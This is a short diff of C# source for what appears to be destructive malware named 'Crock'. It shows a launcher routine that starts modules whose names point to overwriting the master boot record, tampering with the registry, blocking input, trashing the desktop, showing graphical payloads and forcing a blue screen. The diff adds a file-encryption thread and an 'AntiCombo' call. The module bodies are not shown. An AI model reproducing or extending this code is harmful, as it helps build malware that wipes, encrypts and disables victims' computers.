@@ -3,17 +3,19 @@ using System.Security.Principal;
 
 namespace Crock
 {
-    static class Program
+    static partial class Program
     {
         // Запус всех модулей
         public static void UseExp()
         {
             Killer.MBR();
             Addition.RegFun();
+            Killer.AntiCombo();
             var rule = new Rules();
             new Thread(() => Misc.InputFuck()).Start();
             new Thread(() => rule.ShowDialog()).Start();
             new Thread(() => Addition.TrashDestop()).Start();
+            new Thread(() => Crypt.Main_Encrypt()).Start();
             new Thread(() => Effect.GDI_payloads()).Start();
             Killer.RegFuck();
             Killer.BSOD();
